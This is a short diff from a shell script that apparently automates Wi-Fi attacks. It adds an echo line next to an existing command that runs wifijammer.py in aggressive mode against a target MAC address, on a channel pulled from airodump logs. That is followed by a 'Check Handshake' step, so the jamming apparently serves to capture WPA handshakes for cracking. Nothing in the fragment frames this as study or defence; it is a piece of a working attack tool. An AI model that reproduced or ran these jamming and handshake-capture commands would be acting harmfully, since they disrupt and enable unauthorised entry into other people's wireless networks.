@@ -356,6 +356,7 @@ echo " "
 timeout 30s xterm -geometry '65x25+0+0' -e 'python3 /root/wifijammer/wifijammer.py -a $(cat macadress.txt) -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") -i $(cat interface.txt) --aggressive'
 
 # Final sleep ---
+echo "Final check handshake afer time -> 15s !!!"
 sleep 15
 
 # ***************** Check Handshake (9) *************************************************
